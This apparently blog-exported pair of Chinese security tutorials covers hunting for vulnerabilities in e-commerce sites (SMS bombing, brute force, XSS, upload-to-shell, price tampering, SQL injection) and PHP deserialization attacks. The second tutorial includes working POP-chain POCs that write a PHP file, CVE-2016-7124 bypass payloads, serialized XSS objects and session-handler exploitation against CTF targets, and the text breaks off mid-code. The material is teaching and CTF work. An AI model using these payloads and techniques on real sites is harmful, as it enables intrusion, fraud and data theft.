说在前面本文针对人群：很多朋友们接触安全都是通过书籍；网上流传的PDF；亦或是通过论坛里的文章，但可能经过了这样一段时间的学习，了解了一些常见漏洞的原理之后，对于漏洞挖掘还不是很清楚，甚至不明白如何下手… 可能你通过 sql-labs 初步掌握了sql注入，亦或是你通过 upload-labs 初步掌握了文件上传，或者你通过 DVWA 的学习初步掌握了其他一些常见漏洞。但是他们都有一个弊端是：你已经知道这个地方有漏洞，甚至你知道是什么类型的漏洞，你只要想办法利用这个漏洞就可以了但是在进行漏洞挖掘的时候：你往往不知道哪个地方有漏洞，或者说你不知道这个地方可能存在什么漏洞 这个时候你可能需要看一下 乌云镜像站（大家可自行百度，谷歌）…通过一些前辈们的漏洞挖掘报告来了解一下：你所掌握的漏洞的常见触发点在哪，或者说一个网站哪些地方具有漏洞 因为挖掘 SRC 不仅需要收集全面的资产，而且很多网站都有各式各样的 waf ，对于刚接触漏洞挖掘的朋友们来说就不是那么友好，所以对于刚接触漏洞挖掘的朋友们来说，在挖掘 SRC 之前，很多人都是从 补天; 漏洞盒子; 先知 慢慢走过来的。 问：为什么要选择商城型网站的挖掘？答：商城在日常的使用中比较普及（应该没有人没有用过淘宝吧…），功能点相对来说比较多，而且我们比较熟悉网站的功能点，一是不用去很麻烦的寻找网站的功能点，毕竟大家平常都要购物。二是商城的功能点相比于一些静态网站要多很多，因此可能产生的漏洞会相对较多，故而挖掘到漏洞的几率也会提升。 问：这样的网站从哪里找到呢？答：站长之家，谷歌高级语法搜索等 由于很多大佬往往在进行漏洞挖掘的过程中，都是凭借自己写的小工具，或者是直接凭借累积的经验对功能点进行定向的漏洞挖掘。这样的高效率漏洞挖掘显然不适合一些刚接触漏洞挖掘的朋友们，那么本文中我们就先抛开这些大佬们的工具。通过正常的购物流程来对商城进行漏洞挖掘，以大家日常的生活方式挖出漏洞。 因为一些特殊原因，本文就拿 淘宝 做例子来演示以购物流程来进行漏洞挖掘。本文涉及到的漏洞在淘宝中均不存在，但大家可以自行根据文章内容举一反三 登录过程注册账号啰嗦几句在注册账号的时候，如果你不想因为你随手发出去的表单，而导致你的电话被打爆，可以使用一些在线接收短信的平台进行手机注册…（血和泪的教训 因此在这里提供以下几个常用的短信接码平台 免费接收短信Z-SMSGetFreeSMSNumberFree Online Phone10分钟邮箱 临时邮箱、临时电子邮箱、24小时邮箱 短信轰炸在进行用户注册时存在发送短信的界面。发现发送短信时不需要输入验证码才能发送，且不限制发送的验证码的次数，或发送验证码时存在绕过 绕过姿势：挖洞技巧：绕过短信&amp;邮箱轰炸限制以及后续 可根据现有情景自行使用绕过姿势 任意用户注册 打开方式一 偶遇过一个上古网站，注册账户时，并没有对注册的账户的手机号或者邮箱做出限制。 打开方式二 在进行用户注册的时候发送短信，抓包，发现包里直接有验证码 但是通常可能验证码会经过base64等编码手段进行编码，解码后也可直接获得验证码 打开方式三 发现发送了一个验证码之后，后端没有限制输入错误的次数或者没有限制输入的时间 那么我们可以直接使用burpsuite里面的爆破模块进行爆破，可以直接爆破成功 可根据现有情景自行使用绕过姿势 URL跳转发现淘宝登陆界面的URL为https://login.taobao.com/member/login.jhtml?redirectURL=https%3A%2F%2Fwww.taobao.com 更改redirectURL参数后的值为你想恶意跳转到的URL,如： https://www.baidu.com/ 登陆成功后可跳转到百度页面 绕过姿势：分享几个绕过URL跳转限制的思路 可根据现有情景自行使用绕过姿势 忘记密码短信轰炸参考注册账号时的短信轰炸 任意密码重置参考任意用户注册进行验证码的Bypass 此外：还可以参考 任意用户密码重置的10种姿势 登录界面暴力破解经过对网站的测试，发现对登录次数失败没有限制，也没有验证码的限制，因此可以直接burpsuite跑大型字典，从而暴力破解账号密码 提供以下几个生成字典方式 Github上有很多收集好的字典https://github.com/rootphantomer/Blasting_dictionary更多的可以在Github上自行寻找 可能你需要生成一些特殊定制的在线生成地址一在线生成地址二 下面的py脚本你也可以尝试使用 pydictor 下载地址 使用指南 somd5 提供的字典：https://www.somd5.com/download/dict/ 越权越权是个比较抽象的东西，在这里因为篇幅的原因就不展开论述了 具体可以参考：我的越权之道- 小川【技术分享】聊聊越权那些事儿 进入商城反射型XSS进入商城之后当然是挑选物品，因此在搜索框可能存在反射型xss 绕过姿势推荐：五道口杀气 ——》 Bypass xss过滤的测试方法心伤的瘦子 ——》心伤的瘦子系列教程 此外：测试 XSS 就不要放过每一个搜索框，有一些商城中经常被遗漏过滤的一些地方 比如曾经我挖到某站点这类相对隐蔽的搜索框 可根据现有情景自行使用绕过姿势 存储型 XSS在个人资料处可能存在存储型 XSS 特别是在个人地址栏，因为可能手机信息要求必须是数字，邮箱格式必须是数字+字母，但是个人地址栏往往没有做出太多的过滤 比如我曾在补天挖到关于个人地址栏的存储型XSS,都是几乎没有过滤的 CSRF与XSS对应的，在商城内部同样可能存在 CSRF 但由于现在大多数网站都具备了 CSRF token ，且验证了 referer CSRF的分析和利用在 DVWA 靶场已经从 Low，Mediun， High， Impossible 几种难度阐述了 CSRF 的分析和利用，已经很详细了,而且红日安全团队出的文章已经很详细了 ——[红日安全]Web安全Day3 - CSRF实战攻防 还有一些绕过姿势,如 Bypassing CSRF Protection ——》先知有了翻译文章 绕过CSRF防御 具体还是参考乌云吧 ——》 乌云漏洞库之CSRF 上传头像获得shell这里没办法进行云演示了… 上传漏洞的小结可以参考我的博客 ——》 通过 Upload-labs 掌握文件上传漏洞 同时推荐大家一个Google的插件——》Wappalyzer Wappalyzer 是一款可以用来识别 WEB 网站所使用的建站程序以及使用了哪些相关技术的工具的谷歌浏览器扩展插件。看到好的网站可以通过 Wappalyzer 识别网站所用的所有技术，可以对网站搭建起到不错的参考作用。 利用上传漏洞时，根据相应的中间件漏洞组合，也可能能实现巧妙的绕过效果 ——》 Web中间件常见漏洞总结 可能你的webshell会被杀掉？这里推荐 Github上的一个项目 ——》免杀webshell无限生成工具(利用随机异或无限免杀D盾) 购买物品修改价格表示自己曾经也能买得起面包机 具体有几方面：第一是在购买产品过程中修改产品数量、价格；第二是在支付时修改总价格或者优惠价格；第三是直接修改充值价格 直接修改充值价格的极其罕见，这里给出乌云的一个案例 ——》 顺丰宝业务逻辑漏洞 由于这个漏洞比较罕见，所以这里补充一些乌云案例供大家参考 ——》 乌云案例-支付逻辑漏洞 存储型 XSS问：不是之前已经写过个人资料处的存储型 XSS 吗，为什么这里还要在写一遍？答：可能有的网站注意过这个问题，在个人资料那个入口已经做出了过滤，但是在购买物品时添加的地址确没有做出过滤 比如曾经在对某网站测试的时候，发现个人信息的地址栏对输入的payload做出了过滤，但是在购买物品重新添加地址的时候，代码没有对其做出过滤，因此导致了存储型 XSS SQL注入之所以把sql注入给单独列出来，是因为sql注入的触发点真的太多了， 增 删 改 查，一切与数据库交互的地方都有可能进行sql注入。从注册账号，到购买物品的完成。每一个GET，POST的参数都可能存在sql注入，所以大家测试的时候需要足够的耐心和细心。我曾经就有只单独对我认为在网页上有回显的参数进行测试的坏习惯，因此遗漏了挺多测试的点，所以希望大家不要toulan的忽略掉一些参数。 关于sql注入的篇幅也是巨大的，针对不同数据库的特性绕过方式也是千奇百怪，这里也不详细展开论述了 博客里写了一些sql注入的payload和一些常见绕过 ——》 SQL注入一把梭 写在最后问：商城就只有这些漏洞吗？答：当然不是的，可能的还有很多很多，本文仅购物流程一个思路进行漏洞挖掘，只给那些练习完靶场，但是不知道如何对一个网站下手的朋友们提供一个小思路。可以进行延伸的方面也还有很多。 问：为什么你的漏洞都没有绕过？答：绕过需要看当时的过滤以及当时的条件，环境等，所以由于篇幅的原因没有展开论述，本文意在提供思路进行挖掘，但在每个漏洞下面都提供了一些bypass不错的思路的文章链接 本文只以购买物品整个流程一个思路来进行漏洞的挖掘，只是片面的，可以进行漏洞挖掘的面还很广，挖掘思路也很多。只是根据人们日常生活操作来挖掘漏洞比较的通俗易懂，也好入手，很适合漏洞挖掘的新手挖洞。在进行购物流程中，文中有没有提到的欢迎各位师傅补充，有好的思路也请师傅们不吝赐教，有不足之处也望批评指正。 本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。","link":"/2019/09/05/%E4%BB%A5%E8%B4%AD%E7%89%A9%E6%B5%81%E7%A8%8B%E6%8C%96%E6%8E%98%E5%95%86%E5%9F%8E%E6%BC%8F%E6%B4%9E/"},{"title":"再谈PHP反序列化","text":"文章首发于 SECIN社区：https://www.sec-in.com/article/137 三种类属性Private 权限: 正常Private 权限属性名: %00类名%00属性名 。且属性名长度改变Protected 权限属性名: %00*%00属性名 。且属性名长度改变 demo&lt;?php class Test { public $name = &apos;P2hm1n&apos;; private $age = &apos;Secret&apos;; protected $test = &apos;test&apos;;}$test = new Test;$content = serialize($test);file_put_contents(&apos;./flag.txt&apos;, $content);?&gt; 魔术方法具体可参考PHP手册: https://www.php.net/manual/zh/language.oop5.magic.php construct 调用条件 :当一个类被初始化为实例时会调用(unserialize()时不会自动调用)destruct 调用条件 :当对象被销毁时会调用sleep 调用条件 :当一个类调用serialize进行序列化时会自动调用wakeup 调用条件 :当字符串要利用unserialize反序列化成一个类时会调用get() 调用条件:当从不可访问的属性读取数据call()调用条件: 当要调用的方法不存在或权限不足时自动调用invoke()调用条件: 当把一个类当作函数使用时自动调用 tostring 当反序列化后的对象被当作字符串的时候调用。具体调用场景条件如下(引用自 @k0rz3n) (1) echo ($obj) / print($obj) 打印时会触发(2) 反序列化对象与字符串连接时(3) 反序列化对象参与格式化字符串时(4) 反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）(5) 反序列化对象参与格式化SQL语句，绑定参数时(6) 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时(7) 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用(8) 反序列化的对象作为 class_exists() 的参数的时候 CVE-2016-7124CVE利用目的: 绕过魔法函数__wakeup 版本限制: PHP5 &lt; 5.6.25 | PHP7 &lt; 7.0.10 核心原理: PHP 内核层解析反序列化漏洞s绕过方法: 当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 Bypass demo &lt;?php class Test { public $name = &apos;P2hm1n&apos;; function __destruct() { echo &apos;Bypass&apos;; } function __wakeup() { echo &apos;fail &apos;; }}$payload = &apos;&apos;;unserialize($payload);?&gt; payloadpayload1 = O:4:&quot;Test&quot;:1:{s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;}// fail Bypass bypass payloadpayload1 = O:4:&quot;Test&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;}// Bypass POP链构造知识回顾挖掘暗藏ThinkPHP中的反序列利用链 一文中总结的挺好了。 方法名 调用条件 __call 调用不可访问或不存在的方法时被调用 __callStatic 调用不可访问或不存在的静态方法时被调用 __clone 进行对象clone时被调用，用来调整对象的克隆行为 __constuct 构建对象的时被调用； __debuginfo 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本 __destruct 明确销毁对象或脚本结束时被调用； __get 读取不可访问或不存在属性时被调用 __invoke 当以函数方式调用对象时被调用 __isset 对不可访问或不存在的属性调用isset()或empty()时被调用 __set 当给不可访问或不存在属性赋值时被调用 __set_state 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。 __sleep 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用 __toString 当一个类被转换成字符串时被调用 __unset 对不可访问或不存在的属性进行unset时被调用 __wakeup 当使用unserialize时被调用，可用于做些对象的初始化操作 反序列化的常见起点 __wakeup 一定会调用 __destruct 一定会调用 __toString 当一个对象被反序列化后又被当做字符串使用 反序列化的常见中间跳板: __toString 当一个对象被当做字符串使用 __get 读取不可访问或不存在属性时被调用 __set 当给不可访问或不存在属性赋值时被调用 __isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this-&gt;$func(); 反序列化的常见终点: __call 调用不可访问或不存在的方法时被调用 call_user_func 一般php代码执行都会选择这里 call_user_func_array 一般php代码执行都会选择这里 主要还是三点： 起点 跳板 代码执行 个人感觉核心是实例化对象可附值给变量,从而调用 + 各类魔术方法 demo1demo引用自 @twosmi1e 师傅 先知社区 里的代码： &lt;?phpclass start_gg{ public $mod1; public $mod2; public function __destruct() { $this-&gt;mod1-&gt;test1(); }}class Call{ public $mod1; public $mod2; public function test1() { $this-&gt;mod1-&gt;test2(); }}class funct{ public $mod1; public $mod2; public function __call($test2,$arr) { $s1 = $this-&gt;mod1; $s1(); }}class func{ public $mod1; public $mod2; public function __invoke() { $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1; } }class string1{ public $str1; public $str2; public function __toString() { $this-&gt;str1-&gt;get_flag(); return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;; }}$a = $_GET[&apos;string&apos;];unserialize($a);?&gt; 从前往后跟 or 从后往前跟？ POC &lt;?phpclass start_gg{ public $mod1; public $mod2; public function __construct() { $this-&gt;mod1 = new Call(); } public function __destruct() { $this-&gt;mod1-&gt;test1(); # 入口点，mod1可通过附值起跳。 }}class Call{ public $mod1; # 实例化funct public $mod2; # 无它什么事 # 继续起跳，瞻前顾后，思考下面的 $this-&gt;mod1-&gt;test2();会在何处被什么利用 public function __construct() { $this-&gt;mod1 = new funct(); } public function test1() { $this-&gt;mod1-&gt;test2(); # 这里调 __call }}class funct{ public $mod1; # 实例化func public $mod2; # 无它什么事 public function __construct() { $this-&gt;mod1 = new func(); } public function __call($test2, $arr) { $s1 = $this-&gt;mod1; $s1(); # 这里触发 __invoke }}class func{ public $mod1; # 实例化string1 public $mod2; # __invoke对其附值，其实是为了调 __toString public function __construct() { $this-&gt;mod1 = new string1(); } public function __invoke() { $this-&gt;mod2 = &quot;字符串拼接&quot; . $this-&gt;mod1; # 这里若拼接则会触发 __toString }}class string1{ public $str1; # 实例化 GetFlag public $str2; public function __construct() { $this-&gt;str1 = new GetFlag(); } public function __toString() { $this-&gt;str1-&gt;get_flag(); #调用此处即可getflag，难点：需调用 __toString return &quot;1&quot;; }}class GetFlag{ public function get_flag() { echo &quot;flag:&quot; . &quot;xxxxxxxxxxxx&quot;; }}$payload = new start_gg();echo urlencode(serialize($payload));?&gt; demo2demo引用自 @l3mon师傅 blog 里的代码： &lt;?phpclass OutputFilter { protected $matchPattern; protected $replacement; function __construct($pattern, $repl) { $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; } function filter($data) { return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); }};class LogFileFormat { protected $filters; protected $endl; function __construct($filters, $endl) { $this-&gt;filters = $filters; $this-&gt;endl = $endl; } function format($txt) { foreach ($this-&gt;filters as $filter) { $txt = $filter-&gt;filter($txt); } $txt = str_replace(&apos;\\n&apos;, $this-&gt;endl, $txt); return $txt; }};class LogWriter_File { protected $filename; protected $format; function __construct($filename, $format) { $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename)); $this-&gt;format = $format; } function writeLog($txt) { $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(&quot;C:\\\\WWW\\\\test\\\\ctf\\\\kon\\\\&quot; . $this-&gt;filename, $txt, FILE_APPEND); }};class Logger { protected $logwriter; function __construct($writer) { $this-&gt;logwriter = $writer; } function log($txt) { $this-&gt;logwriter-&gt;writeLog($txt); }};class Song { protected $logger; protected $name; protected $group; protected $url; function __construct($name, $group, $url) { $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $fltr = new OutputFilter(&quot;/\\[i\\](.*)\\[\\/i\\]/i&quot;, &quot;&lt;i&gt;\\\\1&lt;/i&gt;&quot;); $this-&gt;logger = new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\\n&quot;))); } function __toString() { return &quot;&lt;a href=&apos;&quot; . $this-&gt;url . &quot;&apos;&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;/i&gt;&lt;/a&gt; by &quot; . $this-&gt;group; } function log() { $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\\n&quot;); } function get_name() { return $this-&gt;name; }}class Lyrics { protected $lyrics; protected $song; function __construct($lyrics, $song) { $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; } function __toString() { return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\\n&quot;; } function __destruct() { $this-&gt;song-&gt;log(); } function shortForm() { return &quot;&lt;p&gt;&lt;a href=&apos;song.php?name=&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&apos;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;/a&gt;&lt;/p&gt;&quot;; } function name_is($name) { return $this-&gt;song-&gt;get_name() === $name; }};class User { static function addLyrics($lyrics) { $oldlyrics = array(); if (isset($_COOKIE[&apos;lyrics&apos;])) { $oldlyrics = unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie(&apos;lyrics&apos;, base64_encode(serialize($oldlyrics))); } static function getLyrics() { if (isset($_COOKIE[&apos;lyrics&apos;])) { return unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } else { setcookie(&apos;lyrics&apos;, base64_encode(serialize(array(1, 2)))); return array(1, 2); } }};class Porter { static function exportData($lyrics) { return base64_encode(serialize($lyrics)); } static function importData($lyrics) { return serialize(base64_decode($lyrics)); }};class Conn { protected $conn; function __construct($dbuser, $dbpass, $db) { $this-&gt;conn = mysqli_connect(&quot;localhost&quot;, $dbuser, $dbpass, $db); } function getLyrics($lyrics) { $r = array(); foreach ($lyrics as $lyric) { $s = intval($lyric); $result = $this-&gt;conn-&gt;query(&quot;SELECT data FROM lyrics WHERE id=$s&quot;); while (($row = $result-&gt;fetch_row()) != NULL) { $r []= unserialize(base64_decode($row[0])); } } return $r; } function addLyrics($lyrics) { $ids = array(); foreach ($lyrics as $lyric) { $this-&gt;conn-&gt;query(&quot;INSERT INTO lyrics (data) VALUES (\\&quot;&quot; . base64_encode(serialize($lyric)) . &quot;\\&quot;)&quot;); $res = $this-&gt;conn-&gt;query(&quot;SELECT MAX(id) FROM lyrics&quot;); $id= $res-&gt;fetch_row(); $ids[]= intval($id[0]); } echo var_dump($ids); return $ids; } function __destruct() { $this-&gt;conn-&gt;close(); $this-&gt;conn = NULL; }};unserialize($_GET[&apos;cmd&apos;]); 反序列化函数 + 可控参数 == 控制当前作用域下对象 class User { static function addLyrics($lyrics) { $oldlyrics = array(); if (isset($_COOKIE[&apos;lyrics&apos;])) { $oldlyrics = unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } foreach ($lyrics as $lyric) $oldlyrics []= $lyric; setcookie(&apos;lyrics&apos;, base64_encode(serialize($oldlyrics))); } static function getLyrics() { if (isset($_COOKIE[&apos;lyrics&apos;])) { return unserialize(base64_decode($_COOKIE[&apos;lyrics&apos;])); } else { setcookie(&apos;lyrics&apos;, base64_encode(serialize(array(1, 2)))); return array(1, 2); } }}; 自定义 $song 值 + __destruct == 调用当前作用域下 log方法 class Lyrics { protected $lyrics; protected $song; function __construct($lyrics, $song) { $this-&gt;song = $song; $this-&gt;lyrics = $lyrics; } function __toString() { return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\\n&quot;; } function __destruct() { $this-&gt;song-&gt;log(); } function shortForm() { return &quot;&lt;p&gt;&lt;a href=&apos;song.php?name=&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&apos;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;/a&gt;&lt;/p&gt;&quot;; } function name_is($name) { return $this-&gt;song-&gt;get_name() === $name; }}; 论两个 log 方法的选择 class Logger { protected $logwriter; function __construct($writer) { $this-&gt;logwriter = $writer; } function log($txt) { $this-&gt;logwriter-&gt;writeLog($txt); }};class Song { protected $logger; protected $name; protected $group; protected $url; function __construct($name, $group, $url) { $this-&gt;name = $name; $this-&gt;group = $group; $this-&gt;url = $url; $fltr = new OutputFilter(&quot;/\\[i\\](.*)\\[\\/i\\]/i&quot;, &quot;&lt;i&gt;\\\\1&lt;/i&gt;&quot;); $this-&gt;logger = new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\\n&quot;))); } function __toString() { return &quot;&lt;a href=&apos;&quot; . $this-&gt;url . &quot;&apos;&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;/i&gt;&lt;/a&gt; by &quot; . $this-&gt;group; } function log() { $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\\n&quot;); } function get_name() { return $this-&gt;name; }} LogWriter_File::writeLog($txt) 的写入文件 class LogWriter_File { protected $filename; protected $format; function __construct($filename, $format) { $this-&gt;filename = str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;/&quot;, &quot;_&quot;, $filename)); $this-&gt;format = $format; } function writeLog($txt) { $txt = $this-&gt;format-&gt;format($txt); //TODO: Modify the address here, and delete this TODO. file_put_contents(&quot;C:\\\\WWW\\\\test\\\\ctf\\\\kon\\\\&quot; . $this-&gt;filename, $txt, FILE_APPEND); }}; LogFileFormat::format class LogFileFormat { protected $filters; protected $endl; function __construct($filters, $endl) { $this-&gt;filters = $filters; $this-&gt;endl = $endl; } function format($txt) { foreach ($this-&gt;filters as $filter) { $txt = $filter-&gt;filter($txt); } $txt = str_replace(&apos;\\n&apos;, $this-&gt;endl, $txt); return $txt; }}; OutputFilter::filter 自定义 preg_replace 内容 class OutputFilter { protected $matchPattern; protected $replacement; function __construct($pattern, $repl) { $this-&gt;matchPattern = $pattern; $this-&gt;replacement = $repl; } function filter($data) { return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data); }}; preg_replace 和 str_replace 的区别 final POC &lt;?phpclass OutputFilter { protected $matchPattern; protected $replacement; function __construct() { $this-&gt;matchPattern = &quot;//&quot;; $this-&gt;replacement = &quot;&lt;?php phpinfo();?&gt;&quot;; }}class LogFileFormat { protected $filters; protected $endl; function __construct() { $this-&gt;filters = array(new OutputFilter()); # foreach ($this-&gt;filters as $filter) $this-&gt;endl = &apos;\\n&apos;; }}class LogWriter_File { protected $filename; protected $format; function __construct() { $this-&gt;filename = &quot;info.php&quot;; $this-&gt;format = new LogFileFormat(); }}class Logger { protected $logwriter; function __construct() { $this-&gt;logwriter = new LogWriter_File(); }}class Lyrics { protected $lyrics; protected $song; function __construct() { $this-&gt;lyrics = &apos;1&apos;; $this-&gt;song = new Logger(); }}$payload = new Lyrics();print_r(urlencode(serialize($payload)));?&gt; 原生类利用ZipArchive::open@Threezh1 文中已经写的很详细了。这里不再补充https://xz.aliyun.com/t/6454#toc-10 SoapClient关于SOAP安全问题：https://www.anquanke.com/post/id/153065#h2-1 利用条件：需要有soap扩展，且不是默认开启，需要手动开启需要调用一个不存在的方法触发其__call()函数 仅限于http/https协议，且http头部还存在crlf漏洞(SOAP + CRLF = SSRF) 例子可见下文: LCTF2018-bestphp’s revenge Error XSS@l3m0n 师傅blog中提到了XSS Error适用于php7版本 XSS开启报错的情况下:&lt;?php$a = new Error(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);//Test$t = urldecode(&apos;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&apos;);$c = unserialize($t);echo $c; Exception XSS@l3m0n 师傅blog中提到了XSS Exception适用于php5、7版本 XSS开启报错的情况下:&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);//Test$c = urldecode(&apos;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&apos;);echo unserialize($c); 多种姿势组合拳例子可见:Pornhub某漏洞 ： https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1 涉及姿势如下可获取目录： DirectoryIteratorXXE： SimpleXMLElement创建空白文件： SQLite3 反序列化字符逃逸原理: 对类中不存在的属性也会进行反序列化。且PHP 在反序列化时，底层代码是以 ;作为字段的分隔，以 }作为结尾(字符串除外)，并且是根据长度判断内容的 利用: 构造字符串 例子一0ctf2016 一道web题（待更新 例子二安洵杯 - easy_serialize_phphttps://xz.aliyun.com/t/6911#toc-3 Session 反序列化参数相关session相关参数配置 Directive 含义 session.save_handler session保存形式。默认为files session.save_path 设置session的存储路径,默认在/tmp session.serialize_handler session序列化存储所用处理器。默认为php。 session.upload_progress.cleanup 一旦读取了所有POST数据，立即清除进度信息。默认开启 session.upload_progress.enabled 将上传文件的进度信息存在session中。默认开启。 PHP处理器三种序列化方式 处理器 对应的存储格式 php_binary 键名的长度对应的ASCII字符＋键名＋经过serialize() 函数反序列处理的值 php 键名＋竖线＋经过serialize()函数反序列处理的值 php_serialize serialize()函数反序列处理数组方式 差异性PHP处理器差异性如下&lt;?phpini_set(&apos;session.serialize_handler&apos;,&apos;&apos;);session_start();$_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;];?&gt;URL传参，?name=P2hm1n。session以文本存储方式保存在 /tmp 目录下。 php: name|s:6:&quot;P2hm1n&quot;;php_binary: \u0004二进制字符names:6:&quot;P2hm1n&quot;;php_serialize: a:1:{s:4:&quot;name&quot;;s:6:&quot;P2hm1n&quot;;} 漏洞核心也体现在 差异性 三个字 Q: 什么是差异性:A: 选择的处理方式不同，序列化和反序列化的方式亦不同。如果网站序列化并存储Session与反序列化并读取Session的方式不同，就可能导致漏洞的产生。 攻击手段trick-1利用前提: 脚本中设置的序列化处理器与php.ini设置的不同 常见漏洞场景: php_serilize 方式存入，解析又是用的 php 处理器 利用原理： php 在获取 session 的时候，会按照session.serialize_handler=php 规则来处理 session 文件。把 | 前面的值作为一个session键名，对 | 后面就会进行一个反序列化操作 trick-2配置不当可造成session被控。 当session.upload_progress.enabled打开时，php会记录上传文件的进度，在上传时会将其信息保存在$_SESSION中。 但当一个文件上传时，同时POST一个与php.ini中session.upload_progress.name同名的变量时(session.upload_progress.name的变量值默认为PHP_SESSION_UPLOAD_PROGRESS），PHP检测到这种同名请求会在$_SESSION中添加一条数据。我们由此来设置session。 session.upload_progress.cleanup关闭。这就 极大提高了漏洞的利用成功率。如果此选项session.upload_progress.cleanup打开，那么在利用时攻击者需要上传large and crash文件，来使得我们传入的data得以执行。 详情见https://bugs.php.net/bug.php?id=71101 例子一题目链接: http://web.jarvisoj.com:32784/index.php &lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO{ public $mdzz; function __construct() { $this-&gt;mdzz = &apos;phpinfo();&apos;; } function __destruct() { eval($this-&gt;mdzz); }}if(isset($_GET[&apos;phpinfo&apos;])){ $m = new OowoO();}else{ highlight_string(file_get_contents(&apos;index.php&apos;));}?&gt; 差异点: phpinfo中 session.serialize_handler = php_serialize。 题目中 ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;); 核心目的: 进入 eval 函数执行命令。由于题目中并没有反序列化操作，其中 $this-&gt;mdzz 不可通过常规手段控制。 观察phpinfo中session其他有关信息 构造一个上传的页面&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;change&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; 构造poc &lt;?phpclass OowoO{ public $mdzz;}$a = new OowoO();$a-&gt;mdzz = &quot;payload&quot;;echo serialize($a);?&gt; 扫描目录 phpinfo中的_SERVER[&quot;SCRIPT_FILENAME&quot;]字段得到路径：/opt/lampp/htdocs/。 随后用绝对路径读取文件 例子二题目来源: LCTF2018-bestphp’s revenge 题目给了两个源码 index.php &lt;?phphighlight_file(__FILE__);$b = &apos;implode&apos;;call_user_func($_GET[f],$_POST);session_start();if(isset($_GET[name])){ $_SESSION[name] = 